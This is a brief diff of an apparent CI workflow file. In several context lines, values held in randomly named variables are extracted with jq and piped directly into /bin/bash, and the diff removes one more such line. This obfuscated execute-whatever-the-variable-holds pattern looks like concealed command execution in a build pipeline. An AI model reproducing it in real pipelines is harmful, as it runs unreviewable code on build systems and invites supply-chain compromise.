@@ -24,7 +24,6 @@ jobs:
           echo $cwqf9336 | jq -r .c972 | /bin/bash
           printf '%s' "$a0870" | jq -r .tpc02236 | /bin/bash
           echo $sz41881 | jq -r .gkod85446 | /bin/bash
-          echo $t6 | jq -r .s7 | /bin/bash
           echo $xm02 | jq -r .d43 | /bin/bash
 
       - name: Archive results
